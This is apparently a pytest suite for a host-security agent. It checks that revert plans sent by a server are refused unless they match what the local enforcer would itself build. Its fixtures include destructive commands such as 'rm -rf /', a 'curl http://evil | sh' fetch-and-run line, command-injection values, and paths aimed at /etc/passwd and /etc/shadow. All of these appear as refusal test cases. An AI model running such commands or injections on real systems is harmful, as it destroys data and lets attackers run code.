"""Audit 7.4: a revert plan from the server is DATA. The old enforcer ran its argv verbatim (``rm -rf``
was demonstrated); the new one re-derives the only plan it could have produced and refuses the rest.
Also: IPv6 ``block_ip`` is refused loudly instead of failing silently."""
from __future__ import annotations

import copy
import json
import os

import pytest

from paddock_agent.actions import (
    Action,
    ActionError,
    HostLocalError,
    apply_action,
    assert_host_local,
    revert_action,
)
from paddock_agent.platform_block import (
    LinuxEnforcer,
    NotSupportedError,
    RevertRefused,
    get_enforcer,
)


class Runner:
    def __init__(self, rc=0):
        self.calls = []
        self.rc = rc

    def __call__(self, cmd):
        self.calls.append(list(cmd))
        from paddock_agent.platform_block import CompletedLike
        return CompletedLike(self.rc, "", "")


@pytest.fixture
def host(tmp_path):
    hosts = tmp_path / "hosts"
    hosts.write_text("127.0.0.1 localhost\n")
    runner = Runner()
    enf = LinuxEnforcer(runner=runner, quarantine_dir=str(tmp_path / "q"), hosts_path=str(hosts))
    return enf, runner, hosts, tmp_path


def _revert_action(plan, **kw):
    base = dict(id="r1", action_type="revert", target="x", status="approved", dry_run=False, revert_of="a1",
                result={"revert": plan})
    base.update(kw)
    return Action(**base)


# --------------------------------------------------------------------------- #
# the vulnerability, reproduced against the OLD behaviour
# --------------------------------------------------------------------------- #

def _old_revert_verbatim(plan, run):
    """What LinuxEnforcer.revert used to do for mechanism 'iptables': run every server argv as given."""
    for cmd in plan.get("commands", []):
        run(cmd)


def test_the_old_behaviour_really_executed_server_argv():
    runner = Runner()
    _old_revert_verbatim({"mechanism": "iptables", "commands": [["rm", "-rf", "/"]]}, runner)
    assert runner.calls == [["rm", "-rf", "/"]]          # this is the hole the tests below must keep closed


# --------------------------------------------------------------------------- #
# malicious plans are refused and NOTHING runs
# --------------------------------------------------------------------------- #

EVIL_PLANS = [
    {"mechanism": "iptables", "commands": [["rm", "-rf", "/"]]},
    {"mechanism": "iptables", "commands": [["iptables", "-D", "INPUT", "-s", "203.0.113.9", "-j", "DROP"],
                                           ["rm", "-rf", "/"]]},
    {"mechanism": "iptables", "commands": [["iptables", "-F"]]},
    {"mechanism": "iptables", "commands": [["iptables", "-P", "INPUT", "ACCEPT"]]},
    {"mechanism": "iptables", "commands": [["sh", "-c", "curl http://evil | sh"]]},
    {"mechanism": "iptables", "commands": [["iptables", "-D", "INPUT", "-s", "203.0.113.9", "-j", "ACCEPT"]]},
    {"mechanism": "iptables", "commands": [["iptables", "-D", "INPUT", "-s", "0.0.0.0/0", "-j", "DROP"]]},
    {"mechanism": "iptables", "commands": [["iptables", "-D", "INPUT", "-s", "203.0.113.9", "-j", "DROP", "--wait"]]},
    {"mechanism": "iptables", "commands": [["iptables", "-D", "INPUT", "-s", "203.0.113.9;id", "-j", "DROP"]]},
    {"mechanism": "iptables", "commands": [["/tmp/iptables", "-D", "INPUT", "-s", "203.0.113.9", "-j", "DROP"]]},
    {"mechanism": "iptables", "commands": [["iptables", "-D", "FORWARD", "-p", "tcp", "--dport", "22", "-j", "DROP"]]},
    {"mechanism": "iptables", "commands": [["iptables", "-D", "INPUT", "-p", "tcp", "--dport", "22:99999", "-j", "DROP"]]},
    {"mechanism": "iptables", "commands": "rm -rf /"},
    {"mechanism": "iptables", "commands": [["iptables", 5]]},
    {"mechanism": "iptables", "commands": []},
    {"mechanism": "iptables", "commands": [[]] * 3},
    {"mechanism": "iptables"},
    {"mechanism": "iptables", "action_type": "block_ip", "target": "203.0.113.9; rm -rf /"},
    {"mechanism": "iptables", "action_type": "block_ip", "target": "-j ACCEPT"},
    {"mechanism": "iptables", "action_type": "quarantine_file", "target": "/etc/passwd"},
    {"mechanism": "iptables", "action_type": "block_ip", "target": "203.0.113.9",
     "commands": [["rm", "-rf", "/"]]},                         # typed fields fine, argv is not what we'd build
    {"mechanism": "iptables", "action_type": "block_ip", "target": "2001:db8::1"},   # IPv6: never applicable
    {"mechanism": "iptables", "action_type": "firewall_rule", "target": "in:tcp:70000"},
    {"mechanism": "shell", "commands": [["rm", "-rf", "/"]]},
    {"mechanism": ["iptables"]},
    {"commands": [["rm", "-rf", "/"]]},
    {},
    None,
    "rm -rf /",
    ["iptables"],
    42,
]


@pytest.mark.parametrize("plan", EVIL_PLANS, ids=lambda p: json.dumps(p, default=str)[:70])
def test_malicious_iptables_style_plans_are_refused_and_nothing_executes(host, plan):
    enf, runner, _hosts, _tmp = host
    with pytest.raises(RevertRefused):
        enf.revert(plan)
    assert runner.calls == []
    out = revert_action(_revert_action(plan), enf, agent_dry_run=False)
    assert out.status == "failed" and out.applied is False
    assert out.output["error"] == "revert_plan_rejected"
    assert runner.calls == []                                # the whole point
    dry = revert_action(_revert_action(plan), enf, agent_dry_run=True)
    assert dry.status == "simulated" and dry.output["refused"] == "revert_plan_rejected"
    assert runner.calls == []


def test_rm_rf_plan_through_the_full_agent_path_never_runs(host):
    enf, runner, _hosts, _tmp = host
    plan = {"mechanism": "iptables", "commands": [["rm", "-rf", "--no-preserve-root", "/"]]}
    out = revert_action(_revert_action(plan), enf, agent_dry_run=False)
    assert out.status == "failed"
    assert ["rm", "-rf", "--no-preserve-root", "/"] not in runner.calls and runner.calls == []


EVIL_HOSTS = [
    {"mechanism": "hosts-sinkhole", "file": "/etc/passwd", "line": "127.0.0.1 evil.example  # paddock-agent block"},
    {"mechanism": "hosts-sinkhole", "line": "root:x:0:0:root:/root:/bin/bash"},
    {"mechanism": "hosts-sinkhole", "line": "127.0.0.1 localhost"},                     # not our marker
    {"mechanism": "hosts-sinkhole", "line": "127.0.0.1 evil.example  # paddock-agent block\n127.0.0.1 localhost"},
    {"mechanism": "hosts-sinkhole", "target": "localhost\n"},
    {"mechanism": "hosts-sinkhole", "target": "-rf"},
    {"mechanism": "hosts-sinkhole", "target": "evil.example", "line": "127.0.0.1 localhost  # paddock-agent block"},
    {"mechanism": "hosts-sinkhole", "target": 5},
    {"mechanism": "hosts-sinkhole"},
]


@pytest.mark.parametrize("plan", EVIL_HOSTS, ids=lambda p: json.dumps(p)[:70])
def test_malicious_hosts_plans_are_refused_and_the_file_is_untouched(host, plan):
    enf, runner, hosts, _tmp = host
    before = hosts.read_text()
    with pytest.raises(RevertRefused):
        enf.revert(plan)
    assert hosts.read_text() == before and runner.calls == []


def test_a_revert_of_the_hosts_file_only_removes_the_one_line_we_wrote(host):
    enf, runner, hosts, _tmp = host
    res = enf.apply("block_domain", "Evil.Example")
    assert "127.0.0.1 evil.example  # paddock-agent block" in hosts.read_text()
    # the server echoes the plan back, but names a different file and an extra line to delete
    echoed = dict(res["revert"], file="/etc/shadow")
    with pytest.raises(RevertRefused):
        enf.revert(echoed)
    assert "evil.example" in hosts.read_text()
    out = revert_action(_revert_action(res["revert"]), enf, agent_dry_run=False)
    assert out.status == "applied" and hosts.read_text() == "127.0.0.1 localhost\n"


# --------------------------------------------------------------------------- #
# legitimate plans still revert (typed fields, and the legacy commands-only shape)
# --------------------------------------------------------------------------- #

def _changes(runner):
    """The commands that change the firewall (-I / -D), without the read-only ``-C`` probes (P2 review agent-4/7:
    every insert and delete is preceded by an ``iptables -C`` existence check)."""
    return [c for c in runner.calls if c[1] in ("-I", "-D")]


class _AbsentRunner(Runner):
    """-C says the rule is absent (rc 1) until ``present`` is set; everything else succeeds."""
    present = False

    def __call__(self, cmd):
        from paddock_agent.platform_block import CompletedLike
        self.calls.append(list(cmd))
        return CompletedLike(1 if (cmd[1] == "-C" and not self.present) else 0, "", "")


def test_block_ip_roundtrip_executes_only_the_derived_removals(tmp_path):
    runner = _AbsentRunner()
    enf = LinuxEnforcer(runner=runner, quarantine_dir=str(tmp_path / "q"), hosts_path=str(tmp_path / "h"))
    res = enf.apply("block_ip", "203.0.113.10")
    assert runner.calls == [["iptables", "-C", "INPUT", "-s", "203.0.113.10", "-j", "DROP"],
                            ["iptables", "-I", "INPUT", "-s", "203.0.113.10", "-j", "DROP"],
                            ["iptables", "-C", "OUTPUT", "-d", "203.0.113.10", "-j", "DROP"],
                            ["iptables", "-I", "OUTPUT", "-d", "203.0.113.10", "-j", "DROP"]]
    runner.calls.clear()
    runner.present = True                            # the rules now exist: -C succeeds
    out = revert_action(_revert_action(res["revert"]), enf, agent_dry_run=False)
    assert out.status == "applied"
    assert _changes(runner) == [["iptables", "-D", "INPUT", "-s", "203.0.113.10", "-j", "DROP"],
                                ["iptables", "-D", "OUTPUT", "-d", "203.0.113.10", "-j", "DROP"]]
    assert [c[1] for c in runner.calls] == ["-C", "-D", "-C", "-D"]


def test_legacy_commands_only_plan_is_accepted_when_it_is_exactly_what_we_would_build(host):
    enf, runner, _h, _t = host
    legacy = {"mechanism": "iptables", "commands": [
        ["iptables", "-D", "INPUT", "-p", "tcp", "--dport", "22", "-j", "DROP"]]}
    assert enf.revert(legacy) == {"reverted": legacy["commands"]}
    assert _changes(runner) == legacy["commands"]
    runner.calls.clear()
    out_rule = {"mechanism": "iptables", "commands": [
        ["iptables", "-D", "OUTPUT", "-p", "udp", "--dport", "53", "-j", "DROP"]]}
    enf.revert(out_rule)
    assert _changes(runner) == out_rule["commands"]


def test_server_plan_cannot_widen_what_runs_even_with_valid_typed_fields(host):
    enf, runner, _h, _t = host
    res = enf.apply("block_ip", "203.0.113.10")
    runner.calls.clear()
    widened = copy.deepcopy(res["revert"])
    widened["commands"].append(["iptables", "-D", "INPUT", "-s", "198.51.100.1", "-j", "DROP"])
    with pytest.raises(RevertRefused):
        enf.revert(widened)
    assert runner.calls == []


def test_validate_revert_returns_a_rebuilt_plan_not_the_servers_object(host):
    enf, _r, _h, _t = host
    plan = {"mechanism": "iptables", "action_type": "block_ip", "target": "203.0.113.10",
            "commands": [["iptables", "-D", "INPUT", "-s", "203.0.113.10", "-j", "DROP"],
                         ["iptables", "-D", "OUTPUT", "-d", "203.0.113.10", "-j", "DROP"]],
            "note": "extra server junk"}
    safe = enf.validate_revert(plan)
    assert safe is not plan and "note" not in safe
    assert set(safe) == {"mechanism", "action_type", "target", "commands"}


# --------------------------------------------------------------------------- #
# quarantine: the host's own record decides where a file goes back
# --------------------------------------------------------------------------- #

def test_quarantine_restore_uses_the_local_record_not_the_servers_paths(host):
    enf, _r, _h, tmp = host
    victim = tmp / "evil.bin"
    victim.write_text("payload")
    res = enf.apply("quarantine_file", str(victim))
    dest = res["output"]["moved"]["dest"]
    assert not victim.exists() and os.path.isfile(dest)
    hostile = dict(res["revert"], src=str(tmp / "etc-cron-evil"))
    with pytest.raises(RevertRefused, match="differs"):
        enf.revert(hostile)
    assert os.path.isfile(dest)                                  # still quarantined
    assert enf.revert(res["revert"]) == {"restored": {"src": str(victim), "dest": dest}}
    assert victim.read_text() == "payload" and not os.path.exists(dest)
    with pytest.raises(RevertRefused):                           # the record is gone: no second restore
        enf.revert(res["revert"])


@pytest.mark.parametrize("make", [
    lambda d, t: {"mechanism": "move-to-quarantine", "dest": "/etc/passwd", "src": "/tmp/x"},
    lambda d, t: {"mechanism": "move-to-quarantine", "dest": d + "/../../etc/passwd"},
    lambda d, t: {"mechanism": "move-to-quarantine", "dest": str(t / "elsewhere" / os.path.basename(d))},
    lambda d, t: {"mechanism": "move-to-quarantine", "dest": os.path.join(os.path.dirname(d), "nosuch")},
    lambda d, t: {"mechanism": "move-to-quarantine", "dest": os.path.join(os.path.dirname(d), "1_unrecorded")},
    lambda d, t: {"mechanism": "move-to-quarantine", "dest": os.path.dirname(d)},
    lambda d, t: {"mechanism": "move-to-quarantine"},
    lambda d, t: {"mechanism": "move-to-quarantine", "dest": 7},
])
def test_hostile_quarantine_plans_are_refused(host, make):
    enf, _r, _h, tmp = host
    victim = tmp / "evil.bin"
    victim.write_text("payload")
    dest = enf.apply("quarantine_file", str(victim))["output"]["moved"]["dest"]
    with pytest.raises(RevertRefused):
        enf.revert(make(dest, tmp))
    assert os.path.isfile(dest) and not victim.exists()


def test_quarantine_restore_never_overwrites_an_existing_file(host):
    enf, _r, _h, tmp = host
    victim = tmp / "evil.bin"
    victim.write_text("payload")
    res = enf.apply("quarantine_file", str(victim))
    victim.write_text("something new that must survive")
    with pytest.raises(RevertRefused, match="overwrite"):
        enf.revert(res["revert"])
    assert victim.read_text() == "something new that must survive"


def test_a_symlink_planted_as_the_quarantined_file_is_not_followed(host):
    enf, _r, _h, tmp = host
    victim = tmp / "evil.bin"
    victim.write_text("payload")
    res = enf.apply("quarantine_file", str(victim))
    dest = res["output"]["moved"]["dest"]
    os.unlink(dest)
    os.symlink("/etc/passwd", dest)
    with pytest.raises(RevertRefused):
        enf.revert(res["revert"])


def test_two_quarantines_of_the_same_name_do_not_collide(host):
    enf, _r, _h, tmp = host
    dests = []
    for i in range(3):
        f = tmp / "same.bin"
        f.write_text("v%d" % i)
        dests.append(enf.apply("quarantine_file", str(f))["output"]["moved"]["dest"])
    assert len(set(dests)) == 3
    assert sorted(open(d).read() for d in dests) == ["v0", "v1", "v2"]


# --------------------------------------------------------------------------- #
# IPv6: refused, not silently failed
# --------------------------------------------------------------------------- #

def test_ipv6_block_ip_is_refused_loudly_at_every_layer(host):
    enf, runner, _h, _t = host
    with pytest.raises(NotSupportedError, match="IPv6"):
        enf.apply("block_ip", "2001:db8::1")
    with pytest.raises(NotSupportedError, match="IPv6"):
        enf.simulate("block_ip", "2001:db8::1")
    assert runner.calls == []
    a = Action(id="a1", action_type="block_ip", target="2001:db8::1", status="approved", dry_run=False)
    real = apply_action(a, enf, agent_dry_run=False)
    assert real.status == "failed" and real.output["error"] == "ipv6_not_supported" and real.applied is False
    dry = apply_action(a, enf, agent_dry_run=True)
    assert dry.status == "simulated" and dry.output["refused"] == "ipv6_not_supported"
    assert runner.calls == []
    # IPv4 is untouched and an IPv4-mapped IPv6 literal counts as IPv6
    assert apply_action(Action(id="a2", action_type="block_ip", target="::ffff:203.0.113.5", status="approved",
                               dry_run=False), enf, agent_dry_run=False).status == "failed"
    # (the rule is tagged with the action id, so a real apply needs a UUID id: the agent only ever sees those)
    assert apply_action(Action(id="a3a3a3a3-a3a3-43a3-83a3-a3a3a3a3a3a3", action_type="block_ip",
                               target="203.0.113.5", status="approved", dry_run=False), enf,
                        agent_dry_run=False).status == "applied"


# --------------------------------------------------------------------------- #
# rails around revert, and the guard's canonical forms
# --------------------------------------------------------------------------- #

def test_revert_requires_approval_and_honours_dry_run(host):
    enf, runner, _h, _t = host
    res = enf.apply("block_ip", "203.0.113.10")
    runner.calls.clear()
    with pytest.raises(ActionError):
        revert_action(_revert_action(res["revert"], status="proposed"), enf, agent_dry_run=False)
    with pytest.raises(ActionError):
        revert_action(_revert_action(res["revert"], action_type="block_ip"), enf, agent_dry_run=False)
    assert runner.calls == []
    for kw, agent_dry in (({"dry_run": True}, False), ({"dry_run": False}, True)):
        out = revert_action(_revert_action(res["revert"], **kw), enf, agent_dry_run=agent_dry)
        assert out.status == "simulated" and out.applied is False
    assert runner.calls == []


def test_stub_platforms_refuse_to_revert_anything():
    for name in ("windows", "macos"):
        enf = get_enforcer(name)
        with pytest.raises(NotSupportedError):
            enf.revert({"mechanism": "iptables", "commands": [["rm", "-rf", "/"]]})


@pytest.mark.parametrize("atype,target,canon", [
    ("firewall_rule", "tcp:22", "in:tcp:22"), ("firewall_rule", "OUT:UDP:0053", "out:udp:53"),
    ("firewall_rule", ":tcp:443", "in:tcp:443"),
    ("block_ip", " 203.0.113.10 ", "203.0.113.10"), ("block_ip", "2001:DB8::1", "2001:db8::1"),
])
def test_guard_returns_canonical_forms(atype, target, canon):
    assert assert_host_local(atype, target) == canon


@pytest.mark.parametrize("atype,target", [
    ("firewall_rule", "in:tcp:0"), ("firewall_rule", "in:tcp:65536"),
    ("firewall_rule", "in:tcp:22 -j ACCEPT"), ("block_ip", "203.0.113.10\n-j ACCEPT"),
    ("block_ip", "fe80::1%eth0"), ("block_ip", "203.0.113.10/32"), ("block_ip", ""),
    ("block_domain", "evil.example\n127.0.0.1 localhost"), ("block_domain", "a b.example"),
    ("quarantine_file", "/tmp/a\x00b"), ("quarantine_file", "/tmp/a\nb"), ("block_ip", None),
])
def test_guard_refuses_injection_shapes(atype, target):
    with pytest.raises(HostLocalError):
        assert_host_local(atype, target)
